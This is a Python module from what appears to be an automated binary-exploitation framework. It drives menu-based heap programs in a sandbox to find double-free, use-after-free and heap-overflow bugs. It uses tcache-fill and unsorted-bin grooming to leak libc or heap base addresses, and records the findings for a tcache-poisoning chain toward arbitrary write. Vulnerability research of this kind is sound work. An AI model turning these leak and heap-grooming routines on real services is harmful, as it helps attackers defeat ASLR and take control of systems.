"""Custom-allocator heap-primitive discovery stage.

Where `heap_check` (the LD_PRELOAD guard) sees only the libc allocator, this stage finds the
target's OWN allocator (a menu service's `ta_alloc`/`ta_free`), drives heap operation SEQUENCES
against it, and traces the pointer lifecycle by ptrace to discover a DOUBLE-FREE (CWE-415) -- the
primitive that seeds tcache poisoning -> arbitrary write. Native x86-64 / ELF only; deterministic.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

from ...jobs.registry import register_stage
from .. import invocation
from ..dynamic import sandbox
from ..fuzz import menu
from ..poc import exploit
from . import heaptrace

HEAP_TRACE_STAGE = "heap_trace"
_HELPER = Path(__file__).with_name("heaptrace.py")


def _alloc_ret_offsets(exe: Path, alloc_name: str) -> list[int]:
    """`ret` offsets inside the alloc function, via objdump, so an alloc-return breakpoint reads
    the pointer in rax. Empty (free-only tracking) when objdump is absent -- fine for the short
    create-then-double-free sequences this stage drives."""
    if not shutil.which("objdump"):
        return []
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    m = re.search(rf"^0*([0-9a-fA-F]+) <{re.escape(alloc_name)}>:\n(.*?)\n\n", out, re.S | re.M)
    if not m:
        return []
    base = int(m.group(1), 16)
    rets = [int(ln.split(":")[0].strip(), 16) for ln in m.group(2).splitlines()
            if ln.strip().endswith("ret")]
    return [r - base for r in rets]


def _plt_addr(exe: Path, name: str) -> int | None:
    """Address of the `<name@plt>` stub, resolved from the DYNAMIC symbols -- available even on a
    fully stripped binary (only .symtab is dropped). Used to trace libc malloc/free directly."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(rf"^0*([0-9a-fA-F]+) <{re.escape(name)}@plt>:", out, re.M)
    return int(m.group(1), 16) if m else None


def _read_width(exe: Path) -> int | None:
    """Fixed-width input width W (read(fd,buf,W) with W>=8), or None for a line-based target. A view
    over the shared interaction.read_shape -- the single read-shape analyzer every stage uses, so a
    read(fd,&c,1) char loop is not misread as a width-1 protocol (which padded every field to one
    byte and desynced the crawl)."""
    from .. import interaction
    try:
        return interaction.read_shape(Path(exe).read_bytes()).width
    except Exception:                                    # noqa: BLE001
        return None


def _libc_plt_pair(exe: Path) -> dict | None:
    """A menu-driven heap challenge that uses libc directly: trace the malloc (or calloc) and free
    PLT stubs. Returns the alloc/free stub addresses, or None when the pair is absent. heap_check's
    guard pages cover libc OVERFLOW; this adds the double-free / UAF it cannot see.

    A C++ program's PLT allocator is `operator new`/`operator delete` (_Znwm / _ZdlPv[m]), which
    wrap malloc/free: operator new returns the pointer in rax (like malloc) and operator delete
    takes it in rdi (like free), so the ptrace alloc/free trace works identically -- without this,
    every C++ heap target (and its UAF -> vtable hijack) is invisible to the chain."""
    free, free_name = _plt_addr(exe, "free"), "free"
    if free is None:                                     # C++ operator delete / delete[]
        for dn in ("_ZdlPv", "_ZdlPvm", "_ZdaPv", "_ZdaPvm"):
            free = _plt_addr(exe, dn)
            if free is not None:
                free_name = dn
                break
    if free is None:
        return None
    # malloc family first (a C program), then C++ operator new / new[]
    for an in ("malloc", "calloc", "reallocarray", "realloc", "_Znwm", "_Znam"):
        a = _plt_addr(exe, an)
        if a is not None:
            return {"alloc_name": f"{an}@plt", "alloc": a, "free_name": f"{free_name}@plt",
                    "free": free, "plt": True}
    return None


def _crawl_menu_model(workdir: Path, exe: Path, opts: list[str], *, width=None) -> dict:
    """Learn each menu option's typed field template by driving the sandboxed target interactively.
    `width` (from `_read_width`) selects the fixed-width read(fd, buf, W) input encoding when the
    target is not line-based. Best-effort: any failure yields {} and the caller falls back."""
    def spawn():
        cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
                                     chdir=str(workdir)) + [str(exe)]
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=str(workdir),
                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
    try:
        return menu.crawl_menu(spawn, opts, per_option=2.5, width=width)
    except Exception:
        return {}


def _spawn_menu(workdir: Path, exe: Path):
    """A fresh sandboxed interactive process for the target (stdin/stdout piped), the same isolation
    the crawl uses."""
    cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
                                 chdir=str(workdir)) + [str(exe)]
    return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, cwd=str(workdir),
                            preexec_fn=sandbox._rlimits(2048, 20, set_as=False))




def _op_writes(opt: str, fields: list, width, *, idx=0, size=0x18, data: bytes = b"",
               fill: bool = True) -> list:
    """The per-FIELD writes for one menu option: [option, field1, field2, ...]. Separate writes (not
    one blob) so an incremental driver can drain between them -- a target whose number reader is a
    fixed read(fd, buf, N)+strtoul number reader consumes N bytes per read and desyncs if several
    fields arrive in one chunk, exactly why a bulk feed failed where the one-field-at-a-time crawl
    worked. A `yn` field (a y/n confirmation in the flow) is answered "y" to proceed. `fill=False`
    sends the `data` buffer SHORT (not padded to the size) so the chunk's tail stays UNINITIALISED --
    an uninit-reuse leak reads that stale tail."""
    out = [menu._scalar(opt.encode(), width)]
    sz = 0
    for f in fields:
        if f == "idx":
            out.append(menu._scalar(str(idx).encode(), width))
        elif f == "num":
            out.append(menu._scalar(str(size).encode(), width))
            sz = size
        elif f == "yn" or f.startswith("yn="):
            ans = f.split("=", 1)[1].encode() if "=" in f else menu._VALUE["yn"]
            out.append(menu._scalar(ans, width))
        elif not width:
            # LINE-BASED target (fgets / read-until-newline char loop): send newline-terminated data,
            # exactly like the crawl did -- read() returns the available bytes (it does NOT block for
            # the full size on a pipe), and a char loop stops at the newline. NUL-padding to the size
            # here would hang a read-until-newline loop. Short by design, so the chunk tail is left
            # UNINITIALISED (what the uninit-reuse leak reads); fill a larger prefix only when asked.
            body = data if data else (b"A" * min(sz, 256) if (fill and sz) else b"A")
            out.append(menu._data(body, None))
        elif not fill:                                   # fixed-width, short -> leave the tail uninit
            out.append(menu._data(data or b"A", width))
        else:                                            # fixed-width: pad each field to the size
            body = data if data else (b"A" * sz if 0 < sz <= 4096 else b"AAAA")
            out.append(body[:sz].ljust(sz, b"\x00") if 0 < sz <= 65536
                       else menu._data(body, width))
    return out


def _drive(workdir: Path, exe: Path, writes: list, *, timeout: float = 10.0, idle: float = 0.2) -> bytes:
    """Drive a staged menu target by sending each write in turn and draining the prompt between
    them (the one-field-at-a-time cadence the crawl uses), returning all captured stdout as raw
    bytes. Keeps a read(fd,buf,N)+strtoul reader in sync where a single bulk write would not."""
    import selectors
    import time as _t
    try:
        p = _spawn_menu(workdir, exe)
    except Exception:
        return b""
    out = b""
    try:
        sel = selectors.DefaultSelector()
        sel.register(p.stdout, selectors.EVENT_READ)
        end = _t.monotonic() + timeout
        # banner + pass any pre-menu prompt (a name/username gate) so writes land on the menu
        menu.drive_to_menu(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 2.0))
        for w in writes:
            if _t.monotonic() >= end:
                break
            try:
                p.stdin.write(w)
                p.stdin.flush()
            except (OSError, ValueError):
                break
            o, alive = menu._drain(p, sel, idle=idle, deadline=min(end, _t.monotonic() + 2.0))
            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
            if not alive:
                break
    finally:
        try:
            p.kill()
        except Exception:
            pass
    return out


def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) -> dict | None:
    """From a crawled menu model, name the add / free / view options a UAF-leak needs.

    add  -- an allocating option (menu._is_alloc: reads a size, usually a string after it).
    free -- an idx-only option (model[o] == ["idx"]).
    view -- an idx option (NOT free) that ECHOES a stored chunk's bytes back. There is no static
            "view" role, so probe it: add(0, MARKER) then call the candidate on index 0 and keep the
            one whose output contains MARKER. That echo is exactly the oracle a UAF read abuses.

    Returns {"add","free","view"} or None when any role is missing."""
    add = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
    idx_only = [o for o in opts if o in model and model[o] == ["idx"]]
    if not (add and idx_only):
        return None
    # VIEW is the idx-op that ECHOES a stored chunk; FREE is an idx-op that does not. They often have
    # the IDENTICAL template (["idx"]), so the roles can only be told apart by PROBING -- don't assume
    # free is the first one (that mislabels view as free when view happens to come first in the menu).
    # An all-DIGIT marker survives a case transform (a target that toupper/tolower/"funkify"s stored
    # text mangles letters; digits are invariant), and we compare case-insensitively as a backstop.
    marker = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
    cands = [o for o in opts if o in model and model[o][:1] == ["idx"]]
    view = None
    for cand in cands:
        writes = _op_writes(add, model[add], width, idx=0, size=0x80, data=marker) \
            + _op_writes(cand, model[cand], width, idx=0)
        out = _drive(workdir, exe, writes, timeout=8.0)
        if marker in out or marker.lower() in out.lower():
            view = cand
            break
    if view is None:
        return None
    free = next((o for o in idx_only if o != view), None)
    if free is None:
        return None
    return {"add": add, "free": free, "view": view}


def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, target_bytes: bytes,
                  libc_data: bytes = b"", unsorted_off: int = 0, timeout: float = 10.0) -> dict | None:
    """Drive Create -> Remove -> Show on the SAME index in one process and recover the base the freed
    chunk discloses. A chunk sized into the UNSORTED bin (>= 0x430) frees with its fd/bk pointing at
    `main_arena + 0x60` (a libc pointer): libc_base = leaked - unsorted_off, confirmed only when that
    subtraction is page-aligned (the honesty guard -- a random pointer will not land on a page). A
    small chunk frees into tcache and leaks a (safe-linked) heap pointer. Also classifies a leaked
    libc/PIE CODE pointer via the shared classifier. Returns {kind, base, leaked, dump, size} or None.
    Reuses leak._le_pointer_words + leak.classify_leak verbatim -- the Show output is a byte blob."""
    import re as _re

    from ..poc import leak as _leak
    add, free, view = ops["add"], ops["free"], ops["view"]

    def _c(opt, **kw):
        return _op_writes(opt, model[opt], width, **kw)

    def _libc_from(out: bytes):
        """A libc base from the Show output, or None. Harvests full 8-byte pointer words AND the
        6-byte little-endian run a printf(\"%s\") viewer leaves when it truncates at the pointer's
        NUL high bytes; accepts `leaked - unsorted_off` only when PAGE-ALIGNED (the guard that both
        avoids fabricating a base and separates a real libc pointer from a 0x7f-prefixed stack one)."""
        vals = [int(m.group(0), 16) for m in _re.finditer(rb"0x[0-9a-fA-F]{6,}", out)]
        vals += _leak._le_pointer_words(out)
        vals += [int.from_bytes(out[i:i + 6], "little") for i in range(len(out) - 5)
                 if out[i + 5] == 0x7F]
        # A viewer that CASE-FOLDS its output (toupper/tolower/"funkify") mangles a leaked pointer's
        # letter bytes and can lowercase the image top byte 0x55/0x56 to 0x75/0x76; recover the
        # un-folded candidates too. The page-alignment guard below and classify_leak's corroboration
        # drop the bogus case-variants, so adding them only RESCUES a transformed leak, never fabricates.
        vals += _leak._case_fold_pointer_candidates(out)
        if unsorted_off:
            for v in vals:
                if 0x7f0000000000 <= v < 0x800000000000:
                    base = v - int(unsorted_off)
                    if base > 0 and base % 0x1000 == 0:
                        return base, v
        cls = _leak.classify_leak(vals, target_bytes, libc_data)   # a leaked libc CODE pointer
        return (cls["libc_base"], None) if cls.get("libc_base") else (None, None)

    # Strategy 1 -- single large chunk: a >=0x430 request frees straight to the unsorted bin (fd =
    # main_arena); a guard chunk keeps it off the top. Works on a notebook with no size cap.
    big = (_c(add, idx=0, size=0x500, data=b"P" * 8) + _c(add, idx=1, size=0x500, data=b"G" * 8)
           + _c(free, idx=0) + _c(view, idx=0))
    # Strategy 2 -- TCACHE-FILL: a notebook that CAPS the request size (rejecting a large chunk) can only
    # allocate tcache-sized chunks, so fill the 0x90 tcache bin with 7 frees and the 8th spills to
    # the unsorted bin (fd = main_arena). Allocate 9 (page 8 guards the top), free 0..7, Show 7.
    fill = []
    for p in range(9):
        fill += _c(add, idx=p, size=0x80, data=b"P" * 8)     # 0x80 user -> 0x90 chunk (above fastbin)
    for p in range(8):
        fill += _c(free, idx=p)
    fill += _c(view, idx=7)
    # Strategy UNINIT-REUSE: a chunk whose data read does NOT fill the allocation leaves the tail
    # uninitialised; after freeing a chunk (fd/bk = main_arena for unsorted, or a safe-linked heap
    # fd for tcache) and re-allocating the SAME size with a SHORT write (fill=False), that stale
    # pointer survives in the tail and a Show of the reused chunk discloses it. Distinct from the UAF
    # read (which views a FREED index): here the chunk is live and re-read, so a notebook that NULLs
    # the pointer on free (no UAF) still leaks. Large size -> a libc pointer; the guards below sort it.
    reuse = (_c(add, idx=0, size=0x500, data=b"A") + _c(add, idx=1, size=0x500, data=b"A")  # guard top
             + _c(free, idx=0) + _c(add, idx=2, size=0x500, data=b"A", fill=False)
             + _c(view, idx=2))
    heap_fallback = None                                 # a leaked heap fd if no libc is reachable
    for writes, show_sz in ((big, 0x500), (fill, 0x80), (reuse, 0x500)):
        out = _drive(workdir, exe, writes, timeout=timeout)
        if not out:
            continue
        base, leaked = _libc_from(out)
        if base:
            return {"kind": "libc", "base": base, "leaked": leaked, "dump": out[:400],
                    "size": show_sz}
        # No libc pointer, but a freed chunk whose fd is a heap address (0x55/0x56 top byte -- a raw
        # or safe-linked tcache fd) is still a DEMONSTRATED heap-ASLR defeat. On a modern glibc the
        # Nth same-size free often stays in tcache (safe-linked fd) instead of spilling to the
        # unsorted bin, so this is the common disclosure when a libc pointer is out of reach.
        if heap_fallback is None:
            hv = next((v for v in _leak._le_pointer_words(out) if (v >> 40) in (0x55, 0x56)), None)
            if hv:
                heap_fallback = {"kind": "heap", "base": hv, "leaked": hv, "dump": out[:400],
                                 "size": show_sz}
    # Strategy 3 -- small single chunk: no libc reachable, but a tcache fd is still a heap-address
    # disclosure (defeats heap ASLR). Separate, so a stray 0x7f value never masquerades as libc.
    out = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8) + _c(add, idx=1, size=0x18)
                 + _c(free, idx=0) + _c(view, idx=0), timeout=timeout)
    if out:
        vals = _leak._le_pointer_words(out)
        heapish = next((v for v in vals if (v >> 40) in (0x55, 0x56)), None)
        if heapish:
            return {"kind": "heap", "base": heapish, "leaked": heapish, "dump": out[:400],
                    "size": 0x18}
    return heap_fallback


def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, alloc):
    """Discover + file a use-after-free READ leak: a notebook whose Show-after-Remove prints a freed
    chunk discloses a libc/heap pointer WITHOUT faulting, so the watchpoint tracer never sees it.
    Files a CWE-416 finding (detector heap_trace, so chain_primitive's _lead_finding consumes it)
    carrying a DEMONSTRATED info-disclosure effect + the recovered base. Returns a metrics dict on a
    hit, else None. Best-effort: self-gates to a target with a real add/free/view menu."""
    import json as _json

    from ...db.dao import FindingDAO
    from ..poc import heap as _heap
    if not (opts and model):
        return None
    ops = identify_heap_ops(workdir, exe, model, opts, width)
    if not ops:
        return None
    # the bundled libc staged beside the target (stage_target put deps under workdir), for the
    # unsorted-bin offset and the leak classifier -- NOT the host libc.
    libc_path = next((p for p in Path(workdir).rglob("libc*.so*") if p.is_file()), None)
    libc_data = libc_path.read_bytes() if libc_path else b""
    unsorted_off = 0
    if libc_path:
        try:
            unsorted_off = int(_heap.unsorted_bin_offset(str(libc_path)) or 0)
        except Exception:
            unsorted_off = 0
    # The tcache-fill strategy drives ~18 menu ops (9 creates + 8 frees + a Show), each with a
    # prompt drain, so it needs a generous budget -- 10s starved it mid-fill and the Show never ran.
    hit = heap_uaf_leak(workdir, exe, ops, model, width, target_bytes=target_bytes,
                        libc_data=libc_data, unsorted_off=unsorted_off, timeout=30.0)
    if not hit:
        return None
    base_hex = hex(hit["base"])
    what = {"libc": "libc base", "pie": "PIE image base", "heap": "heap pointer"}[hit["kind"]]
    detail = (f"Use-after-free READ: Show (option {ops['view']!r}) of an entry freed by option "
              f"{ops['free']!r} disclosed a {what} ({base_hex}) straight out of the freed chunk -- a "
              f"demonstrated memory disclosure that defeats ASLR and seeds a libc-target tcache poison "
              f"-> shell. Sequence: create -> remove -> show on the same index, {hit['size']:#x}-byte "
              f"chunk (an unsorted-bin chunk frees with a libc main_arena pointer).")
    eff = [{"kind": "info-disclosure", "title": f"UAF read leaks {what}", "status": "demonstrated",
            "detail": detail, "proof": {"type": "uaf-leak", "base": base_hex, "kind": hit["kind"],
                                        "view_op": ops["view"], "free_op": ops["free"],
                                        "add_op": ops["add"]}}]
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": "CWE-416", "title": f"Use-after-free read discloses {what} (demonstrated)",
        "severity": "high", "detector": "heap_trace", "state": "corroborated", "confidence": 0.9,
        "dedup_key": f"CWE-416:uaf-leak:{alloc['free_name']}",
        "function_addr": alloc["free"], "site_addr": None, "site_detail": alloc["free_name"],
        "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
                     {"channel": "heap-trace", "detail": detail}]})
    ctx.emit("heaptrace.done", payload={
        "applicable": True, "double_free": False, "use_after_free": True, "heap_overflow": False,
        "allocator": alloc["alloc_name"], "uaf_leak": {"kind": hit["kind"], "base": base_hex,
                                                       "view_op": ops["view"]},
        "vuln": {"vclass": "uaf", "note": f"{alloc['alloc_name']}/{alloc['free_name']}",
                 "leak": {"kind": hit["kind"], "base": base_hex}}})
    ctx.progress(pct=100, msg=f"UAF read leaks {what} {base_hex} (demonstrated disclosure)")
    return {"metrics": {"applicable": True, "use_after_free": True, "uaf_leak": hit["kind"],
                        "base": base_hex}}


def _allocator_ranges(functions: dict, edges, alloc: dict) -> list[list[int]]:
    """[start, end) code ranges of the allocator FAMILY: alloc/free, everything they call
    transitively (a compacting allocator's insert_block/compact/memmove), and same-stem functions.
    A UAF watchpoint firing from inside this code is the allocator's own bookkeeping, not a program
    use-after-free, so the tracer ignores it."""
    if not functions:
        return []
    addrs = sorted(set(functions.values()))

    def _rng(a):
        nxt = next((x for x in addrs if x > a), a + 0x400)
        return [a, nxt]

    stem = re.sub(r"(alloc|free|new|delete|release|dealloc)\w*$", "",
                  alloc["alloc_name"].lstrip("_")).rstrip("_").lower()
    family = {alloc["alloc"], alloc["free"]}
    for name, addr in functions.items():
        if stem and name.split("@")[0].lstrip("_").lower().startswith(stem):
            family.add(addr)
    # transitive callees of alloc/free (compaction/bookkeeping helpers)
    adj: dict = {}
    for e in edges or []:
        try:
            src = int(str(e.src_addr), 16) if isinstance(e.src_addr, str) else int(e.src_addr)
        except (TypeError, ValueError):
            continue
        if e.dst_name in functions:
            adj.setdefault(src, set()).add(functions[e.dst_name])
    seen, queue = set(family), list(family)
    while queue:
        for callee in adj.get(queue.pop(), ()):
            if callee not in seen:
                seen.add(callee)
                queue.append(callee)
    return sorted(_rng(a) for a in seen)


def heap_trace_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, FindingDAO, StringDAO, TargetDAO
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("heap_trace requires a target_id")
    host = sandbox.host_arch()
    if (target.arch and target.arch != host) or (target.file_type or "").lower() not in ("elf", ""):
        ctx.emit("heaptrace.done", payload={"applicable": False,
                 "note": "custom-allocator tracing is native x86-64 / ELF only"})
        return {}

    # elf_functions gives name -> INT addr from the symbol table (the DAO stores hex strings);
    # a hand-rolled allocator is a NAMED local symbol, exactly what this reads.
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
               if getattr(x, "value", None)]
    # StringDAO is filled by the DISASSEMBLE stage; fall back to a direct byte scan so menu detection
    # does not depend on stage ordering (the same reason _looks_like_heap_menu uses raw_strings).
    opts = menu.detect_menu(strings) or menu.detect_menu(invocation.raw_strings(target_bytes))
    alloc = heaptrace.identify_allocator(functions, edges)
    # A stripped target has no named allocator; if it is a menu-driven heap service we fall back to
    # tracing libc malloc/free directly (resolved from the PLT below, once the binary is on disk).
    if not alloc and not opts:
        ctx.emit("heaptrace.done", payload={"applicable": False,
                 "note": "no distinct custom allocator found (libc malloc/free is covered by "
                         "heap_check); nothing to trace"})
        ctx.progress(pct=100, msg="no custom allocator to trace")
        return {}

    workdir = Path(tempfile.mkdtemp(prefix="lykos-heaptrace-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        os.chmod(exe, 0o755)
        helper = workdir / "heaptrace.py"
        helper.write_bytes(_HELPER.read_bytes())

        plt_mode = False
        if not alloc:                                    # symbol-free: trace the libc PLT stubs
            alloc = _libc_plt_pair(exe)
            if not alloc:
                ctx.emit("heaptrace.done", payload={"applicable": False,
                         "note": "no named custom allocator and no libc malloc/free to trace"})
                ctx.progress(pct=100, msg="no allocator to trace")
                return {}
            plt_mode = True

        pie = (target.mitigations or {}).get("pie") == "on"
        # PLT mode has no local `ret` to read rax from and no local allocator family to exclude.
        ret_offs = [] if plt_mode else _alloc_ret_offsets(exe, alloc["alloc_name"])
        # Allocator-family code ranges (alloc/free + their callees + same-stem functions), so a UAF
        # watchpoint that fires from the allocator's own bookkeeping/compaction is not mis-reported.
        ignore_ranges = [] if plt_mode else _allocator_ranges(functions, edges, alloc)
        # Learn each option's typed field template (Name/Surname/Age/size/Note ...) by driving the
        # live process, so a rich add flow actually ALLOCATES -- the generic (option,size,data)
        # guess never would. menu_op_sequences builds correctly-typed op-sequences from it;
        # fall back to the generic shapes when crawling finds no allocator flow.
        # Fixed-width read(fd, buf, W) targets consume exactly W bytes per field (dreamdiary-style);
        # the crawl and the op-sequences must pad each field to W instead of newline-delimiting.
        width = _read_width(exe)
        model = _crawl_menu_model(workdir, exe, opts, width=width) if opts else {}
        seqs = menu.menu_op_sequences(model, opts, width=width) \
            or heaptrace.heap_op_sequences(opts) or [
            b"1\n64\nA\n2\n0\n2\n0\n", b"1\n2\n2\n",                 # double-free
            b"1\n64\nA\n2\n0\n3\n0\n", b"1\n2\n3\n", b"1\n2\n3\n4\n",  # UAF (alloc, free, use)
            b"1\n2\n4\n", b"1\n64\nA\n2\n0\n4\n0\n",
            b"1\n16\nA\n2\n0\n" + b"B" * 128 + b"\n",               # heap overflow (over-long)
            b"1\n16\nA\n3\n0\n" + b"B" * 128 + b"\n"]
        ctx.emit("heaptrace.allocator", payload={
            "alloc": alloc["alloc_name"], "free": alloc["free_name"],
            "alloc_addr": hex(alloc["alloc"]), "free_addr": hex(alloc["free"]),
            "sequences": len(seqs)})
        ctx.progress(msg=f"tracing {alloc['alloc_name']}/{alloc['free_name']} over {len(seqs)} "
                         "operation sequences")

        found = None
        for i, seq in enumerate(seqs):
            if ctx.should_cancel():
                break
            spec = workdir / "spec.json"
            report = workdir / "report.json"
            report.unlink(missing_ok=True)
            spec.write_text(json.dumps({
                "exe": str(exe), "stdin": seq.hex(), "free_off": alloc["free"],
                "alloc_off": alloc["alloc"], "alloc_ret_offs": ret_offs, "pie": pie,
                "alloc_is_plt": plt_mode,
                "ignore_ranges": ignore_ranges, "report": str(report), "timeout": 8}))
            cmd = (sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)])
                   + ["python3", str(helper), str(spec), str(report)])
            try:
                sandbox.run_reaped(cmd, timeout=15, capture_output=True, cwd=str(workdir),
                                   preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
            except Exception:
                continue
            try:
                rep = json.loads(report.read_text())
            except Exception:
                continue
            if rep.get("double_free") or rep.get("use_after_free") or rep.get("heap_overflow"):
                found = (seq, rep)
                break

        if not found:
            # No FAULT surfaced -- but a notebook's real primitive is often a use-after-free READ
            # (Show-after-Remove prints a freed chunk's libc/heap pointer) that never faults, so the
            # watchpoint tracer above cannot see it. Try that leak explicitly before giving up.
            leak_hit = None
            try:
                leak_hit = _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts,
                                         width, alloc)
            except Exception:
                leak_hit = None
            if leak_hit:
                return leak_hit
            ctx.emit("heaptrace.done", payload={
                "applicable": True, "double_free": False, "use_after_free": False,
                "heap_overflow": False, "allocator": alloc["alloc_name"],
                "note": (f"traced the target's own allocator ({alloc['alloc_name']}/"
                         f"{alloc['free_name']}) over {len(seqs)} operation sequences; no "
                         "double-free, use-after-free or heap overflow surfaced. Menu semantics "
                         "may need analyst-supplied op sequences.")})
            ctx.progress(pct=100, msg="no heap primitive surfaced on the custom allocator")
            return {"metrics": {"applicable": True, "double_free": False}}

        seq, rep = found
        input_sha = ctx.put_artifact("heap-op-sequence", data=seq)
        if rep.get("double_free"):
            _cwe, _title, _kind, _why = ("CWE-415", "Double free", "double_free",
                                         "freed a chunk that was already free")
        elif rep.get("use_after_free"):
            _cwe, _title, _kind, _why = ("CWE-416", "Use-after-free", "uaf",
                                         "read/wrote a chunk after it was freed")
        else:
            _cwe, _title, _kind, _why = ("CWE-122", "Heap-based buffer overflow", "heap_overflow",
                                         "wrote past the end of an allocated chunk")
        _seeds = ("Corrupts the adjacent chunk's header -> allocator metadata attack"
                  if _kind == "heap_overflow" else "Seeds tcache poisoning -> arbitrary write")
        detail = (f"{_title} ({_cwe}) discovered on the target's own allocator "
                  f"{alloc['alloc_name']}/{alloc['free_name']}: the traced sequence {_why}. "
                  f"{_seeds}. (op sequence {input_sha[:12]})")
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": _cwe, "title": _title, "severity": "high" if _kind == "double_free" else "critical",
            "detector": "heap_trace", "state": "corroborated", "confidence": 0.85,
            "dedup_key": f"{_cwe}:heaptrace:{alloc['free_name']}",
            "function_addr": alloc["alloc"] if _kind == "heap_overflow" else alloc["free"],
            "site_addr": None,
            "site_detail": alloc["alloc_name"] if _kind == "heap_overflow" else alloc["free_name"],
            "evidence": [{"channel": "heap-trace", "detail": detail}]})
        ctx.emit("heaptrace.done", payload={
            "applicable": True, "double_free": _kind == "double_free", "use_after_free": _kind == "uaf",
            "heap_overflow": _kind == "heap_overflow",
            "allocator": alloc["alloc_name"], "input_sha": input_sha,
            # the aaheg chainer consumes this Vuln shape (double_free/uaf -> tcache-poison chain)
            "vuln": {"vclass": _kind, "note": f"{alloc['alloc_name']}/{alloc['free_name']}"}})
        ctx.progress(pct=100, msg=f"{_title.lower()} discovered on {alloc['free_name']}")
        return {"metrics": {_kind: True}, "output_shas": [input_sha]}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def register() -> None:
    register_stage(HEAP_TRACE_STAGE, heap_trace_stage, resource_class="cpu",
                   tool="ptrace", tool_version="1")


def enqueue_heap_trace(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, HEAP_TRACE_STAGE, target_id=target.id,
                         params=params or {}, force=force)
